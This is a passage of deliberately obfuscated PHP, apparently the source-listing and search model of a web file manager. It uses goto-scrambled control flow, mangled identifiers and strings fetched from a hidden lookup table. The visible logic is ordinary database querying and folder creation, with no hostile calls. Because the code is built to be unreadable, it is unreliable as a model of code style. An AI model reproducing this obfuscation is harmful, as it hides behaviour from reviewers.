trim($fè±ñÂ’Š­[$a¥·¥øº£³[1748]])); } $Dõµß¡‹¹í = $this->_parseSearchWhere($fè±ñÂ’Š­); goto bôÑğìù™; bôÑğìù™: if (!isset($Dõµß¡‹¹í[$a¥·¥øº£³[417]])) { $Dõµß¡‹¹í[$a¥·¥øº£³[417]] = 0; } $C»¨ƒåìß = $a¥·¥øº£³[1907]; $a‰ù¤˜ğƒ = $C»¨ƒåìß; goto AŸŒÕ¾ˆĞ¨; AŸŒÕ¾ˆĞ¨: $this->_listSearchBindPinyin($fè±ñÂ’Š­, $Dõµß¡‹¹í, $C»¨ƒåìß); $this->alias($a¥·¥øº£³[511])->_makeOrder(); $Dõµß¡‹¹í = $this->parseWhereLike($Dõµß¡‹¹í); goto e÷ğºÁƒÃğ; BŒÆçù™·‡: return $dñº²æÓ®È; goto b±ì™Øº©Ú; b±ì™Øº©Ú: } private function _listSearchTag(&$A™©Ü¯Œ†é, $FÉõÕ¯óÓ, $c«äÚŞÜâ¥) { goto CŸ­ÌŸ«š; a‚îŠœÏ‘´: $E¥°ìÜƒ‘ = array_to_keyvalue($E¥°ìÜƒ‘, $aïµ÷°É¼ã[33], $aïµ÷°É¼ã[75]); $c˜ëÕ²ˆ¿ô = array_unique($E¥°ìÜƒ‘); $this->_listSearchMerge($A™©Ü¯Œ†é, $FÉõÕ¯óÓ, $c«äÚŞÜâ¥, $c˜ëÕ²ˆ¿ô); goto F —ŞÆì‡‰; C¶¸ÍŒÜ„™: $Cùƒê°¦†ö = array(); $D¼Ä½¿´³Ş = $FÉõÕ¯óÓ[$aïµ÷°É¼ã[1748]]; foreach ($D«±–¢ßÄ‡ as $F¬Ñìß–ë½) { $EÕ‚äœŸ = $F¬Ñìß–ë½[$aïµ÷°É¼ã[28]]; $fŒƒÓÚ• = str_replace($aïµ÷°É¼ã[50], $aïµ÷°É¼ã[33], Pinyin::encode($EÕ‚äœŸ)); if (stripos($EÕ‚äœŸ, $D¼Ä½¿´³Ş) !== !1 || stripos($fŒƒÓÚ•, $D¼Ä½¿´³Ş) !== !1) { $Cùƒê°¦†ö[] = $F¬Ñìß–ë½[$aïµ÷°É¼ã[388]]; } } goto e«¨ÄáŞƒ; CŸ­ÌŸ«š: $aïµ÷°É¼ã =& $_SERVER[Â€Á›¨õ]; if (!$FÉõÕ¯óÓ[$aïµ÷°É¼ã[1748]] || $A™©Ü¯Œ†é[$aïµ÷°É¼ã[362]][$aïµ÷°É¼ã[349]] > 1) { return; } $D«±–¢ßÄ‡ = Model($aïµ÷°É¼ã[1908])->listData(); goto C¶¸ÍŒÜ„™; e«¨ÄáŞƒ: if (!$Cùƒê°¦†ö) { return; } $c®¯ÚÕ•º¹ = array($aïµ÷°É¼ã[413] => array($aïµ÷°É¼ã[7], $Cùƒê°¦†ö), $aïµ÷°É¼ã[1501] => USER_ID); $E¥°ìÜƒ‘ = Model($aïµ÷°É¼ã[414])->field($aïµ÷°É¼ã[75])->where($c®¯ÚÕ•º¹)->select(); goto a‚îŠœÏ‘´; F —ŞÆì‡‰: } private function _listSearchDesc(&$d°”Í‚ì­–, $Dôä›õÁÆŞ, $Cñ‹¹ØÇì) { goto Fó÷ºÕ¹ù; Cï•Íó¶³Û: $D½…ğ½Ò‰Ş = array_unique($D½…ğ½Ò‰Ş); if (!$D½…ğ½Ò‰Ş) { return; } $bçáìŒ©Ã¿ = array($fˆ“ãí¿©ê[390] => array($fˆ“ãí¿©ê[7], $D½…ğ½Ò‰Ş), $fˆ“ãí¿©ê[92] => $fˆ“ãí¿©ê[425], $fˆ“ãí¿©ê[370] => array($fˆ“ãí¿©ê[378], $fˆ“ãí¿©ê[1750] . $Dôä›õÁÆŞ[$fˆ“ãí¿©ê[1748]] . $fˆ“ãí¿©ê[1750])); goto bØ©‡š«ä; Fó÷ºÕ¹ù: $fˆ“ãí¿©ê =& $_SERVER[Â€Á›¨õ]; if (!$Dôä›õÁÆŞ[$fˆ“ãí¿©ê[1748]] || $d°”Í‚ì­–[$fˆ“ãí¿©ê[362]][$fˆ“ãí¿©ê[349]] > 1) { return; } $D½…ğ½Ò‰Ş = $this->listSearchChildren($Dôä›õÁÆŞ[$fˆ“ãí¿©ê[472]]); goto Cï•Íó¶³Û; bØ©‡š«ä: $côèÅ§ìé = Model($fˆ“ãí¿©ê[527])->field($fˆ“ãí¿©ê[390])->where($bçáìŒ©Ã¿)->select(); $eÛÓÂòš  = array_to_keyvalue($côèÅ§ìé, $fˆ“ãí¿©ê[33], $fˆ“ãí¿©ê[390]); $this->_listSearchMerge($d°”Í‚ì­–, $Dôä›õÁÆŞ, $Cñ‹¹ØÇì, $eÛÓÂòš ); goto CÉİ«İµÍñ; CÉİ«İµÍñ: } private function _listSearchGroupTag(&$CŸ°Ä³åñÂ, $e‘éÌŠ®ëÓ, $Aäµ›‡Ãè) { goto CñÄÆ±½ë; EÜ…‚ÀŠ¸: if (!$FÜÀÄ£´µ¦) { return; } $eíğÍöËÂ¶ = array($C‡­´ä„½İ[413] => array($C‡­´ä„½İ[7], $FÜÀÄ£´µ¦), $C‡­´ä„½İ[1501] => 0, $C‡­´ä„½İ[29] => $C‡­´ä„½İ[1772] . $CİÆåƒò¥¨); $D¥ó‹çŠ¨ß = Model($C‡­´ä„½İ[414])->field($C‡­´ä„½İ[75])->where($eíğÍöËÂ¶)->select(); goto CíŒ˜……õ‚; e—ÃåŸÉ¢£: $FÜÀÄ£´µ¦ = array(); $C‚¹’ĞÁ± = $e‘éÌŠ®ëÓ[$C‡­´ä„½İ[1748]]; foreach ($Eóçğß÷„‚[$C‡­´ä„½İ[365]] as $aĞ•æìòÇë) { $bÙöìİ¡Â‰ = $aĞ•æìòÇë[$C‡­´ä„½İ[28]]; $e·Åš‡ò“° = str_replace($C‡­´ä„½İ[50], $C‡­´ä„½İ[33], Pinyin::encode($bÙöìİ¡Â‰)); if (stripos($bÙöìİ¡Â‰, $C‚¹’ĞÁ±) !== !1 || stripos($e·Åš‡ò“°, $C‚¹’ĞÁ±) !== !1) { $FÜÀÄ£´µ¦[] = $aĞ•æìòÇë[$C‡­´ä„½İ[388]]; } } goto EÜ…‚ÀŠ¸; AÒ£÷Òğ¯×: if (!$Cª‹ÍÄÎâÇ || $Cª‹ÍÄÎâÇ[$C‡­´ä„½İ[398]] != SourceModel::TYPE_GROUP) { return; } $CİÆåƒò¥¨ = $Cª‹ÍÄÎâÇ[$C‡­´ä„½İ[478]]; $Eóçğß÷„‚ = Model($C‡­´ä„½İ[1909])->get($CİÆåƒò¥¨); goto e—ÃåŸÉ¢£; CíŒ˜……õ‚: $D¥ó‹çŠ¨ß = array_to_keyvalue($D¥ó‹çŠ¨ß, $C‡­´ä„½İ[33], $C‡­´ä„½İ[75]); $a›§±ãØŞÔ = array_unique($D¥ó‹çŠ¨ß); $this->_listSearchMerge($CŸ°Ä³åñÂ, $e‘éÌŠ®ëÓ, $Aäµ›‡Ãè, $a›§±ãØŞÔ); goto e¦”œÇ… ¬; CñÄÆ±½ë: $C‡­´ä„½İ =& $_SERVER[Â€Á›¨õ]; if (!$e‘éÌŠ®ëÓ[$C‡­´ä„½İ[1748]] || $CŸ°Ä³åñÂ[$C‡­´ä„½İ[362]][$C‡­´ä„½İ[349]] > 1 || !$e‘éÌŠ®ëÓ[$C‡­´ä„½İ[472]]) { return; } $Cª‹ÍÄÎâÇ = $this->sourceInfo($e‘éÌŠ®ëÓ[$C‡­´ä„½İ[472]]); goto AÒ£÷Òğ¯×; e¦”œÇ… ¬: } private function _listSearchMerge(&$b‰‚é‰öŸ, $e¯¨°öÕ Á, $dê«ø´«µ, $a‹ƒ•Éƒ£ô) { goto C¾Öá·Îˆ‘; FØÈçïÅ‹–: $d…âçñµ… = $this->field($dê«ø´«µ)->where($EÏÅàëÄˆ)->select(); if (!$d…âçñµ…) { return; } $có¡Ûáä¸ = array(); goto fŸµ°÷İŞé; FšôîàŠÄ: $b·‡Î¼ÆÅ” = array_diff($a‹ƒ•Éƒ£ô, $E„àÁîŒ©); if (!$b·‡Î¼ÆÅ”) { return; } $EÏÅàëÄˆ = array($cÀâ…çËÅ©[390] => array($cÀâ…çËÅ©[7], $b·‡Î¼ÆÅ”)); goto FØÈçïÅ‹–; fŸµ°÷İŞé: foreach ($d…âçñµ… as $C¬ŒÈØç–µ) { if ($this->_listSearchFilter($C¬ŒÈØç–µ, $e¯¨°öÕ Á)) { $có¡Ûáä¸[] = $C¬ŒÈØç–µ; } } $b‰‚é‰öŸ[$cÀâ…çËÅ©[365]] = array_merge($có¡Ûáä¸, $b‰‚é‰öŸ[$cÀâ…çËÅ©[365]]); $b‰‚é‰öŸ[$cÀâ…çËÅ©[362]][$cÀâ…çËÅ©[363]] += count($có¡Ûáä¸); goto F»ˆõ–Áø; C¾Öá·Îˆ‘: $cÀâ…çËÅ© =& $_SERVER[Â€Á›¨õ]; if (!$a‹ƒ•Éƒ£ô) { return; } $E„àÁîŒ© = array_to_keyvalue($b‰‚é‰öŸ[$cÀâ…çËÅ©[365]], $cÀâ…çËÅ©[33], $cÀâ…çËÅ©[390]); goto FšôîàŠÄ; F»ˆõ–Áø: } private function _listSearchFilter($C‘„Œª‘½, $d‡§ÒØ²…) { goto fÆëÀöÛ§; dØôÔµÁ…: if (isset($d‡§ÒØ²…[$Déİ¾ºïí[399]]) && $d‡§ÒØ²…[$Déİ¾ºïí[399]] != $Déİ¾ºïí[1715]) { if ($d‡§ÒØ²…[$Déİ¾ºïí[399]] == $Déİ¾ºïí[76] && !$bÌŒè¢õ¶Ç) { return !1; } if ($d‡§ÒØ²…[$Déİ¾ºïí[399]] != $Déİ¾ºïí[76] && $bÌŒè¢õ¶Ç) { return !1; } if (!strstr($C‘„Œª‘½[$Déİ¾ºïí[167]], $Déİ¾ºïí[47] . $d‡§ÒØ²…[$Déİ¾ºïí[399]] . $Déİ¾ºïí[47])) { return !1; } } if (isset($d‡§ÒØ²…[$Déİ¾ºïí[1910]]) && $d‡§ÒØ²…[$Déİ¾ºïí[1910]] < $C‘„Œª‘½[$Déİ¾ºïí[77]]) { return !1; } if (isset($d‡§ÒØ²…[$Déİ¾ºïí[1911]]) && $d‡§ÒØ²…[$Déİ¾ºïí[1911]] > $C‘„Œª‘½[$Déİ¾ºïí[77]]) { return !1; } goto bÆëØŠˆìó; bÆëØŠˆìó: if (isset($d‡§ÒØ²…[$Déİ¾ºïí[557]]) && $d‡§ÒØ²…[$Déİ¾ºïí[557]] != $C‘„Œª‘½[$Déİ¾ºïí[428]]) { return !1; } return !0; goto B¯¾óñË±µ; fÆëÀöÛ§: $Déİ¾ºïí =& $_SERVER[Â€Á›¨õ]; $bÌŒè¢õ¶Ç = $C‘„Œª‘½[$Déİ¾ºïí[397]] == $Déİ¾ºïí[86]; if (!strstr($C‘„Œª‘½[$Déİ¾ºïí[481]], $Déİ¾ºïí[47] . $d‡§ÒØ²…[$Déİ¾ºïí[472]] . $Déİ¾ºïí[47])) { return !1; } goto dØôÔµÁ…; B¯¾óñË±µ: } public function listSearchChildren($Fá‹Ô‘Ÿé, $FšÓÕêÚöÄ = 5000) { goto bô®©ùÏí; bô®©ùÏí: $c’²ïÈ­Ü =& $_SERVER[Â€Á›¨õ]; $BäŠ÷×àÍ = array(); $C¯•õ—Š„“ = $this->sourceInfo($Fá‹Ô‘Ÿé); goto AÕŒ¢–‰ñ; AÕŒ¢–‰ñ: $e°Š£È“ã° = array($c’²ïÈ­Ü[481] => array($c’²ïÈ­Ü[378], $C¯•õ—Š„“[$c’²ïÈ­Ü[481]] . $C¯•õ—Š„“[$c’²ïÈ­Ü[390]] . $c’²ïÈ­Ü[508])); $DÊë„Öğ˜Æ = $this->field($c’²ïÈ­Ü[390])->cache(null, 600)->where($e°Š£È“ã°)->count(); if ($DÊë„Öğ˜Æ > $FšÓÕêÚöÄ) { return $this->_listSearchChildrenNear($Fá‹Ô‘Ÿé, $FšÓÕêÚöÄ); } goto e”ó²ùË‚; e”ó²ùË‚: $BóŸ‹õß¾š = $this->field($c’²ïÈ­Ü[390])->where($e°Š£È“ã°)->select(); $BäŠ÷×àÍ = array_to_keyvalue($BóŸ‹õß¾š, $c’²ïÈ­Ü[33], $c’²ïÈ­Ü[390]); return $BäŠ÷×àÍ; goto e¸Í‡‘‘É; e¸Í‡‘‘É: } private function _listSearchChildrenNear($BÎñÈ‹ÑôŸ, $C¯½²¾ò÷) { goto cæØ‹·ÆÄ; D•¿à¼¦ç: $cÖÁŠ¨óÄé = $this->field($f‚÷Ñ±ÈæÏ[1912])->where($b¯‹ù‚¢ŒÓ)->select(); $cƒ¥Ş…‰ƒç = array_to_keyvalue(array_filter_by_field($cÖÁŠ¨óÄé, $f‚÷Ñ±ÈæÏ[397], $f‚÷Ñ±ÈæÏ[86]), $f‚÷Ñ±ÈæÏ[33], $f‚÷Ñ±ÈæÏ[390]); $D¸õŸ¦£‘ = array_merge($D¸õŸ¦£‘, array_to_keyvalue($cÖÁŠ¨óÄé, $f‚÷Ñ±ÈæÏ[33], $f‚÷Ñ±ÈæÏ[390])); goto bÒ÷œà­†©; bÒ÷œà­†©: if (!$cƒ¥Ş…‰ƒç) { return $D¸õŸ¦£‘; } $b¯‹ù‚¢ŒÓ = array($f‚÷Ñ±ÈæÏ[472] => array($f‚÷Ñ±ÈæÏ[7], $cƒ¥Ş…‰ƒç)); $cÖÁŠ¨óÄé = $this->field($f‚÷Ñ±ÈæÏ[1912])->where($b¯‹ù‚¢ŒÓ)->limit($C¯½²¾ò÷)->select(); goto Fù»Á†ËÛê; Fù»Á†ËÛê: $D¸õŸ¦£‘ = array_merge($D¸õŸ¦£‘, array_to_keyvalue($cÖÁŠ¨óÄé, $f‚÷Ñ±ÈæÏ[33], $f‚÷Ñ±ÈæÏ[390])); $D¸õŸ¦£‘ = array_slice($D¸õŸ¦£‘, 0, $C¯½²¾ò÷); return $D¸õŸ¦£‘; goto A‹ç¡ğ±ò; cæØ‹·ÆÄ: $f‚÷Ñ±ÈæÏ =& $_SERVER[Â€Á›¨õ]; $D¸õŸ¦£‘ = array(); $b¯‹ù‚¢ŒÓ = array($f‚÷Ñ±ÈæÏ[472] => $BÎñÈ‹ÑôŸ); goto D•¿à¼¦ç; A‹ç¡ğ±ò: } private function _listSearchBindPinyin($eæ¨ù†Íù, &$C» ôë™¢Ø, &$bİ¤øô´) { goto F›óàÍËÍ°; FŒöç¸¡Ï: $C» ôë™¢Ø = $bâÒÆİ®¤ì; goto B‡—‰ù‚æ; e«÷‘–¢«: $bİ¤øô´ = $F‚çá™ŒÀŒ[1914] . str_replace($F‚çá™ŒÀŒ[47], $F‚çá™ŒÀŒ[1915], $bİ¤øô´); $FÜ¼ÌÉ = $C» ôë™¢Ø[$F‚çá™ŒÀŒ[28]]; unset($C» ôë™¢Ø[$F‚çá™ŒÀŒ[28]]); goto cİ»ÄÛ‹…È; cİ»ÄÛ‹…È: foreach ($C» ôë™¢Ø as $CÇÄò®ÔÉ => $DÑÌÍ¼Íïœ) { $bâÒÆİ®¤ì[$F‚çá™ŒÀŒ[1914] . $CÇÄò®ÔÉ] = $DÑÌÍ¼Íïœ; } foreach ($FÜ¼ÌÉ as $F «»‹ö¤) { $bâÒÆİ®¤ì[] = array($F‚çá™ŒÀŒ[1916] => $F «»‹ö¤, $F‚çá™ŒÀŒ[932] => $F‚çá™ŒÀŒ[1752], array($F‚çá™ŒÀŒ[1917] => $F «»‹ö¤, $F‚çá™ŒÀŒ[1918] => array($F‚çá™ŒÀŒ[7], array($F‚çá™ŒÀŒ[438], $F‚çá™ŒÀŒ[437])))); } $this->join($c„Ãøœª); goto FŒöç¸¡Ï; CÌ„…µø§: $c„Ãøœª = "\x4c\x45\x46\x54\40\112\117\x49\116\x20{$this->tablePrefix}\151\157\137\163\157\x75\x72\143\145\x5f\155\145\164\141\40\x6d\x65\164\x61\x20\x6f\156\40\x73\157\x75\x72\143\145\x2e\x73\157\165\162\143\145\111\x44\40\75\x20\155\x65\x74\141\56\163\157\x75\x72\143\145\x49\x44"; $bâÒÆİ®¤ì = array(); $bİ¤øô´ = str_replace(array($F‚çá™ŒÀŒ[227], $F‚çá™ŒÀŒ[50], $F‚çá™ŒÀŒ[1913]), $F‚çá™ŒÀŒ[33], $bİ¤øô´); goto e«÷‘–¢«; F›óàÍËÍ°: $F‚çá™ŒÀŒ =& $_SERVER[Â€Á›¨õ]; if (!isset($eæ¨ù†Íù[$F‚çá™ŒÀŒ[1748]]) || !$eæ¨ù†Íù[$F‚çá™ŒÀŒ[1748]]) { return; } if (!Input::check($eæ¨ù†Íù[$F‚çá™ŒÀŒ[1748]], $F‚çá™ŒÀŒ[314]) || strlen($eæ¨ù†Íù[$F‚çá™ŒÀŒ[1748]]) < 2) { return; } goto CÌ„…µø§; B‡—‰ù‚æ: } private function _parseSearchWhere($a·å‘êÙ²) { goto b‡£ÔË½“; e¹Å°áôíÀ: if (isset($a·å‘êÙ²[$e“¥–Š…ƒç[557]]) && $a·å‘êÙ²[$e“¥–Š…ƒç[557]]) { $e×Ñ‚¡ÚÆ[] = array($e“¥–Š…ƒç[428] => $a·å‘êÙ²[$e“¥–Š…ƒç[557]], $e“¥–Š…ƒç[426] => $a·å‘êÙ²[$e“¥–Š…ƒç[557]], $e“¥–Š…ƒç[932] => $e“¥–Š…ƒç[1752]); } if (isset($a·å‘êÙ²[$e“¥–Š…ƒç[399]]) && $a·å‘êÙ²[$e“¥–Š…ƒç[399]]) { $C¼¬™¶ñ¡ì = $a·å‘êÙ²[$e“¥–Š…ƒç[399]]; if ($C¼¬™¶ñ¡ì == $e“¥–Š…ƒç[76]) { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[397]] = 1; } else { if ($C¼¬™¶ñ¡ì == $e“¥–Š…ƒç[1922]) { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[397]] = 0; } else { if ($C¼¬™¶ñ¡ì) { $C¼¬™¶ñ¡ì = is_array($C¼¬™¶ñ¡ì) ? $C¼¬™¶ñ¡ì : explode($e“¥–Š…ƒç[47], $C¼¬™¶ñ¡ì); $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[399]] = array($e“¥–Š…ƒç[405], $C¼¬™¶ñ¡ì); $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[397]] = 0; } } } } if (isset($a·å‘êÙ²[$e“¥–Š…ƒç[472]]) && $a·å‘êÙ²[$e“¥–Š…ƒç[472]]) { $Aç‚àÆ¤— = $this->sourceInfo($a·å‘êÙ²[$e“¥–Š…ƒç[472]]); $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[548]] = array($e“¥–Š…ƒç[507], $Aç‚àÆ¤—[$e“¥–Š…ƒç[481]] . $a·å‘êÙ²[$e“¥–Š…ƒç[472]] . $e“¥–Š…ƒç[508]); } goto d’Ñ‹œİğö; d‡ñ·±¸ÒÀ: if (isset($a·å‘êÙ²[$e“¥–Š…ƒç[470]]) && $a·å‘êÙ²[$e“¥–Š…ƒç[470]]) { $BŠó‰å¢† = array($e“¥–Š…ƒç[1920], $a·å‘êÙ²[$e“¥–Š…ƒç[470]]); if ($e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[83]]) { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[83]] = array($e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[83]], $BŠó‰å¢†, $e“¥–Š…ƒç[1921]); } else { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[83]] = $BŠó‰å¢†; } } if (isset($a·å‘êÙ²[$e“¥–Š…ƒç[1910]]) && $a·å‘êÙ²[$e“¥–Š…ƒç[1910]] > 0) { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[77]] = array($e“¥–Š…ƒç[1919], $a·å‘êÙ²[$e“¥–Š…ƒç[1910]]); } if (isset($a·å‘êÙ²[$e“¥–Š…ƒç[1911]]) && $a·å‘êÙ²[$e“¥–Š…ƒç[1911]]) { $BŠó‰å¢† = array($e“¥–Š…ƒç[1920], $a·å‘êÙ²[$e“¥–Š…ƒç[1911]]); if ($e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[77]]) { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[77]] = array($e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[77]], $BŠó‰å¢†, $e“¥–Š…ƒç[1921]); } else { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[77]] = $BŠó‰å¢†; } } goto e¹Å°áôíÀ; d’Ñ‹œİğö: if (isset($a·å‘êÙ²[$e“¥–Š…ƒç[1748]]) && trim($a·å‘êÙ²[$e“¥–Š…ƒç[1748]])) { $f­ªÈõÄù = trim($a·å‘êÙ²[$e“¥–Š…ƒç[1748]]); $C³¹ØØµ… = explode($e“¥–Š…ƒç[50], $f­ªÈõÄù); if (strlen($f­ªÈõÄù) > 2 && (substr($f­ªÈõÄù, 0, 1) == $e“¥–Š…ƒç[115] && substr($f­ªÈõÄù, -1) == $e“¥–Š…ƒç[115]) || substr($f­ªÈõÄù, 0, 1) == $e“¥–Š…ƒç[55] && substr($f­ªÈõÄù, -1) == $e“¥–Š…ƒç[55]) { $f­ªÈõÄù = substr($f­ªÈõÄù, 1, -1); $C³¹ØØµ… = array($f­ªÈõÄù); } $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[28]] = array(array($e“¥–Š…ƒç[507], $e“¥–Š…ƒç[1750] . $f­ªÈõÄù . $e“¥–Š…ƒç[1750])); if (count($C³¹ØØµ…) > 1) { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[28]] = array(); foreach ($C³¹ØØµ… as $Fªìéîë•) { if (!trim($Fªìéîë•)) { continue; } $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[28]][] = array($e“¥–Š…ƒç[507], $e“¥–Š…ƒç[1750] . trim($Fªìéîë•) . $e“¥–Š…ƒç[1750]); } } } return $e×Ñ‚¡ÚÆ; goto dÉœ·Ü½à¦; b‡£ÔË½“: $e“¥–Š…ƒç =& $_SERVER[Â€Á›¨õ]; $e×Ñ‚¡ÚÆ = array(); if (isset($a·å‘êÙ²[$e“¥–Š…ƒç[715]]) && $a·å‘êÙ²[$e“¥–Š…ƒç[715]]) { $e×Ñ‚¡ÚÆ[$e“¥–Š…ƒç[83]] = array($e“¥–Š…ƒç[1919], $a·å‘êÙ²[$e“¥–Š…ƒç[715]]); } goto d‡ñ·±¸ÒÀ; dÉœ·Ü½à¦: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Fö³“‡Ã–Ñ) { $Fá¡èËã®› =& $_SERVER[Â€Á›¨õ]; $B¾©ŒšÕµœ = Model($Fá¡èËã®›[497])->where(array($Fá¡èËã®›[1493] => $Fö³“‡Ã–Ñ))->find(); $cåá””¡¸ğ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Fö³“‡Ã–Ñ, $B¾©ŒšÕµœ[$Fá¡èËã®›[28]]); $this->userDesktopAdd($cåá””¡¸ğ); return $cåá””¡¸ğ; } public function userDesktopAdd($FÇÚášøë¿) { $eºÂ¦è­¼ =& $_SERVER[Â€Á›¨õ]; $dÛù´õ´Çë = LNG($eºÂ¦è­¼[1923]); $C•¥ã×õ = $this->mkdir($FÇÚášøë¿, $dÛù´õ´Çë); $this->metaSet($C•¥ã×õ, $eºÂ¦è­¼[1924], $eºÂ¦è­¼[86]); $this->metaSet($FÇÚášøë¿, $eºÂ¦è­¼[1925], $C•¥ã×õ); } public function groupRootAdd($E­‘ìèÕùî) { $cÁ¿ÙùİÒŒ =& $_SERVER[Â€Á›¨õ]; $B°çƒ×§è = Model($cÁ¿ÙùİÒŒ[480])->where(array($cÁ¿ÙùİÒŒ[1743] => $E­‘ìèÕùî))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $E­‘ìèÕùî, $B°çƒ×§è[$cÁ¿ÙùİÒŒ[28]]); } public function systemRootPathAdd($E™«ÏÎ¤Ú) { if ($E™«ÏÎ¤Ú != $_SERVER[Â€Á›¨õ][500]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $E™«ÏÎ¤Ú); } public function userRootRemove($a¡‰¹Šó—¨) { $Bƒø•‹ÀÑä = $this->sourceRoot(SourceModel::TYPE_USER, $a¡‰¹Šó—¨); if (!$Bƒø•‹ÀÑä) { return; } $this->remove($Bƒø•‹ÀÑä, !1); } public function groupRootRemove($DíÍ™ô’‰Š) { $EåŒºäÆœ = $this->sourceRoot(SourceModel::TYPE_GROUP, $DíÍ™ô’‰Š); if (!$EåŒºäÆœ) { return; } $this->remove($EåŒºäÆœ, !1); } private function _mkdirRoot($cÒ·÷‡ÏöØ, $EËÖ¢°ƒ™İ, $e£å´öé) { goto cÀ‚·÷ïßÔ; fÉĞ–•§¸‡: $eªº¬àçø‰ = $this->add($fµé½¬Œ­); $bË†ˆÕ©¢£ = array($D›Å„¯ÚŠØ[550] => short_id($eªº¬àçø‰)); $this->where(array($D›Å„¯ÚŠØ[404] => $eªº¬àçø‰))->save($bË†ˆÕ©¢£); goto eÆæÒ«ó©ê; eÆæÒ«ó©ê: CacheLock::unlock($F˜‹”„¬¾); return $eªº¬àçø‰; goto CÕğêŠ˜º‹; cÀ‚·÷ïßÔ: $D›Å„¯ÚŠØ =& $_SERVER[Â€Á›¨õ]; $fµé½¬Œ­ = array($D›Å„¯ÚŠØ[389] => 0, $D›Å„¯ÚŠØ[544] => $cÒ·÷‡ÏöØ, $D›Å„¯ÚŠØ[545] => $EËÖ¢°ƒ™İ, $D›Å„¯ÚŠØ[541] => 1, $D›Å„¯ÚŠØ[546] => USER_ID, $D›Å„¯ÚŠØ[547] => USER_ID, $D›Å„¯ÚŠØ[542] => $D›Å„¯ÚŠØ[33], $D›Å„¯ÚŠØ[548] => $D›Å„¯ÚŠØ[493], $D›Å„¯ÚŠØ[416] => 0, $D›Å„¯ÚŠØ[543] => 0, $D›Å„¯ÚŠØ[442] => 0, $D›Å„¯ÚŠØ[549] => $D›Å„¯ÚŠØ[33]); if ($E®ê¯ƒ‡ÙÕ = $this->where($fµé½¬Œ­)->find()) { return $E®ê¯ƒ‡ÙÕ[$D›Å„¯ÚŠØ[390]]; } goto DÅ‹º•£ğÀ; DÅ‹º•£ğÀ: $F˜‹”„¬¾ = "\x4d\x6f\x64\145\154\x53\157\x75\162\x63\x65\x2e\x6d\x6b\144\x69\x72\x52\157\x6f\164\x2e{$cÒ·÷‡ÏöØ}\56{$EËÖ¢°ƒ™İ}\56" . $e£å´öé; CacheLock::lock($F˜‹”„¬¾); $fµé½¬Œ­[$D›Å„¯ÚŠØ[28]] = $e£å´öé; goto fÉĞ–•§¸‡; CÕğêŠ˜º‹: } private function sourceRoot($cèÅ×Äãé, $fÛÄ¶¾Ë¦©, $F”ë£Æ‘Êì = false) { $fåŠçÚå÷¹ =& $_SERVER[Â€Á›¨õ]; $E¦‡œğ¾ë¢ = array($fåŠçÚå÷¹[389] => 0, $fåŠçÚå÷¹[544] => $cèÅ×Äãé, $fåŠçÚå÷¹[545] => $fÛÄ¶¾Ë¦©); if ($a©«…ÍÉÉ = $this->where($E¦‡œğ¾ë¢)->find()) { return $F”ë£Æ‘Êì ? $a©«…ÍÉÉ : $a©«…ÍÉÉ[$fåŠçÚå÷¹[390]]; } return !1; } public function sourceRootGroup($A‰Û­ä¹‰‰) { goto B ÀµåÛ¸; d£¹â·´Ş©: return array_to_keyvalue($aÃ¥¹‘Ê™ß[$EÛ—®‚ëÎ[74]], $EÛ—®‚ëÎ[478]); goto bá¼Ÿ‡£²Ÿ; B ÀµåÛ¸: $EÛ—®‚ëÎ =& $_SERVER[Â€Á›¨õ]; if (is_string($A‰Û­ä¹‰‰)) { $A‰Û­ä¹‰‰ = array($A‰Û­ä¹‰‰); } $DÔ‘‘éÂ‰Â = array($EÛ—®‚ëÎ[389] => 0, $EÛ—®‚ëÎ[544] => SourceModel::TYPE_GROUP, $EÛ—®‚ëÎ[545] => array($EÛ—®‚ëÎ[7], $A‰Û­ä¹‰‰)); goto EÈ˜Öº‘; EÈ˜Öº‘: $this->selectPageReset(); $aÃ¥¹‘Ê™ß = $this->listSource($DÔ‘‘éÂ‰Â, 1000); $this->selectPageRestore(); goto d£¹â·´Ş©; bá¼Ÿ‡£²Ÿ: } public function mkfile($d·¯™âø­Õ, $d®’Ø²÷Êœ, $aÊ¨ƒğ×¨Í = '', $C„‚íù´„ = REPEAT_RENAME) { $e¦·ÀÛÉöñ =& $_SERVER[Â€Á›¨õ]; $D–™è…Êí‹ = Model($e¦·ÀÛÉöñ[566])->addFileByContent($aÊ¨ƒğ×¨Í, $d®’Ø²÷Êœ); return $this->_createFileCall($d·¯™âø­Õ, $d®’Ø²÷Êœ, $D–™è…Êí‹, $C„‚íù´„, $e¦·ÀÛÉöñ[1187]); } public function addFile($dìåäÏá­, $aõğ¼Û‚Á¶, $CÉø¼ÔŒ”†, $F×Ä½™ = false, $EÔ¼»ÕÑÄ˜ = REPEAT_RENAME) { $a·¹ ã¼í = Model($_SERVER[Â€Á›¨õ][566])->addFile($aõğ¼Û‚Á¶, $CÉø¼ÔŒ”†, $F×Ä½™); return $this->_createFileCall($dìåäÏá­, $CÉø¼ÔŒ”†, $a·¹ ã¼í, $EÔ¼»ÕÑÄ˜); } public function addFileByFileID($AÜêº™ÎÚÃ, $B›…¯ÄŠ, $Aâ”İÖ¡Ğ”, $d“Ü÷‚‰ = REPEAT_RENAME) { $AéÚÅ¡„¦› =& $_SERVER[Â€Á›¨õ]; $eÉ¾Ğ„ø…ˆ = Model($AéÚÅ¡„¦›[566])->find($B›…¯ÄŠ); 